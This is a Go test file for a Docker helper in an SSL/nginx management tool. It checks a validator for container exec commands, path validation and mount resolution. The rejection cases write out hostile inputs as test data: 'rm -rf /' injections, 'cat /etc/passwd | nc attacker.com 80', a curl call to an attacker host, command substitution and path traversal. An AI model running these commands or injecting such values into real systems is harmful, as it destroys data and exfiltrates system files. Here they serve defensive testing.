package docker

import (
	"fmt"
	"testing"

	"github.com/zhuxbo/sslctl/pkg/util"
)

func TestValidateExecCommand(t *testing.T) {
	tests := []struct {
		name    string
		cmd     string
		wantErr bool
	}{
		// 基本命令
		{"nginx test", "nginx -t", false},
		{"nginx reload", "nginx -s reload", false},
		{"cat file", "cat /etc/nginx/nginx.conf", false},
		{"ls dir", "ls -1 /etc/nginx/", false},
		{"test file", "test -f /etc/nginx/nginx.conf", false},

		// ShellQuote 包裹的路径（回归测试）
		{"cat with ShellQuote", fmt.Sprintf("cat %s", util.ShellQuote("/path/with space")), false},
		{"cat with ShellQuote special", fmt.Sprintf("cat %s", util.ShellQuote("/etc/nginx/conf.d/site.conf")), false},
		{"ls with ShellQuote", fmt.Sprintf("ls -1 %s", util.ShellQuote("/etc/nginx/conf.d")), false},

		// ls glob 模式（回归测试）
		{"ls glob with redirect", "ls -1 /etc/nginx/conf.d/*.conf 2>/dev/null", false},
		{"ls glob simple", "ls -1 /etc/nginx/*.conf", false},

		// 条件执行
		{"test and echo", "test -f /etc/nginx/nginx.conf && echo ok", false},
		{"nginx test with redirect", "nginx -t 2>&1", false},

		// 危险命令 - 应该被拒绝
		{"command injection semicolon", "nginx -t; rm -rf /", true},
		{"command injection pipe", "cat /etc/passwd | nc attacker.com 80", true},
		{"command injection or", "nginx -t || rm -rf /", true},
		{"command substitution backtick", "cat `whoami`", true},
		{"command substitution dollar", "cat $(whoami)", true},
		{"variable expansion", "cat ${HOME}/file", true},
		{"newline injection", "nginx -t\nrm -rf /", true},

		// 不允许的命令
		{"disallowed command rm", "rm -rf /", true},
		{"disallowed command curl", "curl http://attacker.com", true},
		{"empty command", "", true},

		// 长度限制
		{"command too long", string(make([]byte, 4097)), true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validateExecCommand(tt.cmd)
			if (err != nil) != tt.wantErr {
				t.Errorf("validateExecCommand(%q) error = %v, wantErr %v", tt.cmd, err, tt.wantErr)
			}
		})
	}
}

func TestValidateExecCommand_ShellQuoteRegression(t *testing.T) {
	// 专门测试 ShellQuote 产生的命令格式
	// ShellQuote 使用单引号包裹路径，如: '/path/to/file'
	// 如果路径包含单引号，会转义为: 'path'\''with'\''quote'

	testCases := []struct {
		name string
		path string
	}{
		{"simple path", "/etc/nginx/nginx.conf"},
		{"path with space", "/etc/nginx/conf.d/my site.conf"},
		{"path with special chars", "/etc/nginx/conf.d/site-name_v2.conf"},
		{"deep path", "/var/www/html/sites/example.com/nginx.conf"},
	}

	for _, tc := range testCases {
		t.Run("cat "+tc.name, func(t *testing.T) {
			cmd := fmt.Sprintf("cat %s", util.ShellQuote(tc.path))
			if err := validateExecCommand(cmd); err != nil {
				t.Errorf("validateExecCommand(%q) failed: %v", cmd, err)
			}
		})

		t.Run("ls "+tc.name, func(t *testing.T) {
			cmd := fmt.Sprintf("ls -1 %s", util.ShellQuote(tc.path))
			if err := validateExecCommand(cmd); err != nil {
				t.Errorf("validateExecCommand(%q) failed: %v", cmd, err)
			}
		})
	}
}

func TestValidateExecCommand_LsGlobRegression(t *testing.T) {
	// 回归测试：验证 Docker 扫描器使用的 ls glob 模式
	// 来自 internal/nginx/docker/scanner.go:172
	// output, err := s.client.Exec(ctx, fmt.Sprintf("ls -1 %s/*.conf 2>/dev/null", util.ShellQuote(dir)))

	testCases := []struct {
		name string
		dir  string
	}{
		{"nginx conf.d", "/etc/nginx/conf.d"},
		{"nginx sites-enabled", "/etc/nginx/sites-enabled"},
		{"path with space", "/etc/nginx/my configs"},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			// 模拟 scanner.go 的实际调用模式
			cmd := fmt.Sprintf("ls -1 %s/*.conf 2>/dev/null", util.ShellQuote(tc.dir))
			if err := validateExecCommand(cmd); err != nil {
				t.Errorf("validateExecCommand(%q) failed: %v\nThis breaks Docker scanner functionality!", cmd, err)
			}
		})
	}
}

func TestFindMountForPath(t *testing.T) {
	client := NewClient("abc123")
	mounts := []MountInfo{
		{Type: "bind", Source: "/host/nginx", Destination: "/etc/nginx", RW: true},
		{Type: "bind", Source: "/host/ssl", Destination: "/etc/nginx/ssl", RW: true},
		{Type: "bind", Source: "/host/www", Destination: "/var/www", RW: true},
		{Type: "volume", Source: "data-vol", Destination: "/data", RW: true},       // volume 类型，应忽略
		{Type: "bind", Source: "/host/ro", Destination: "/readonly", RW: false},     // 只读，应忽略
	}

	tests := []struct {
		name          string
		containerPath string
		wantSource    string
		wantNil       bool
	}{
		{"最长路径匹配", "/etc/nginx/ssl/cert.pem", "/host/ssl", false},
		{"次长路径匹配", "/etc/nginx/conf.d/site.conf", "/host/nginx", false},
		{"www 路径", "/var/www/html/index.html", "/host/www", false},
		{"无匹配", "/opt/app/file", "", true},
		{"volume 类型忽略", "/data/file", "", true},
		{"只读挂载忽略", "/readonly/file", "", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			mount := client.FindMountForPath(mounts, tt.containerPath)
			if tt.wantNil {
				if mount != nil {
					t.Errorf("expected nil, got mount with source %q", mount.Source)
				}
				return
			}
			if mount == nil {
				t.Fatal("expected non-nil mount")
			}
			if mount.Source != tt.wantSource {
				t.Errorf("mount.Source = %q, want %q", mount.Source, tt.wantSource)
			}
		})
	}
}

func TestResolveHostPath(t *testing.T) {
	client := NewClient("abc123")

	tests := []struct {
		name          string
		containerPath string
		mount         *MountInfo
		want          string
	}{
		{
			name:          "简单路径转换",
			containerPath: "/etc/nginx/ssl/cert.pem",
			mount:         &MountInfo{Source: "/host/ssl", Destination: "/etc/nginx/ssl"},
			want:          "/host/ssl/cert.pem",
		},
		{
			name:          "深层路径",
			containerPath: "/var/www/html/sites/example.com/index.html",
			mount:         &MountInfo{Source: "/host/www", Destination: "/var/www"},
			want:          "/host/www/html/sites/example.com/index.html",
		},
		{
			name:          "完全匹配",
			containerPath: "/etc/nginx",
			mount:         &MountInfo{Source: "/host/nginx", Destination: "/etc/nginx"},
			want:          "/host/nginx",
		},
		{
			name:          "nil mount",
			containerPath: "/etc/nginx/cert.pem",
			mount:         nil,
			want:          "",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := client.ResolveHostPath(tt.containerPath, tt.mount)
			if got != tt.want {
				t.Errorf("ResolveHostPath(%q) = %q, want %q", tt.containerPath, got, tt.want)
			}
		})
	}
}

func TestNewClient(t *testing.T) {
	client := NewClient("test-container-id")
	if client.GetContainerID() != "test-container-id" {
		t.Errorf("GetContainerID() = %q", client.GetContainerID())
	}
	if client.IsComposeMode() {
		t.Error("expected IsComposeMode() = false")
	}
}

func TestNewComposeClient(t *testing.T) {
	client := NewComposeClient("/path/docker-compose.yml", "nginx")
	if !client.IsComposeMode() {
		t.Error("expected IsComposeMode() = true")
	}
}

func TestSetContainer(t *testing.T) {
	client := NewClient("")
	client.SetContainer("new-id")
	if client.GetContainerID() != "new-id" {
		t.Errorf("GetContainerID() = %q after SetContainer", client.GetContainerID())
	}
}

func TestIsNumeric(t *testing.T) {
	tests := []struct {
		input string
		want  bool
	}{
		{"123", true},
		{"644", true},
		{"0", true},
		{"", false},
		{"abc", false},
		{"12a", false},
		{"-1", false},
	}

	for _, tt := range tests {
		t.Run(tt.input, func(t *testing.T) {
			if got := isNumeric(tt.input); got != tt.want {
				t.Errorf("isNumeric(%q) = %v, want %v", tt.input, got, tt.want)
			}
		})
	}
}

func TestIsValidContainerPath(t *testing.T) {
	tests := []struct {
		name string
		path string
		want bool
	}{
		{"valid absolute path", "/etc/nginx/nginx.conf", true},
		{"valid deep path", "/var/www/html/site/cert.pem", true},
		{"empty path", "", false},
		{"relative path", "etc/nginx/nginx.conf", false},
		{"path traversal", "/etc/nginx/../passwd", false},
		{"path with semicolon", "/etc/nginx/;rm -rf /", false},
		{"path with pipe", "/etc/nginx/|cat", false},
		{"path with backtick", "/etc/nginx/`whoami`", false},
		{"path with dollar paren", "/etc/nginx/$(whoami)", false},
		{"path too long", "/" + string(make([]byte, 4096)), false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := isValidContainerPath(tt.path); got != tt.want {
				t.Errorf("isValidContainerPath(%q) = %v, want %v", tt.path, got, tt.want)
			}
		})
	}
}
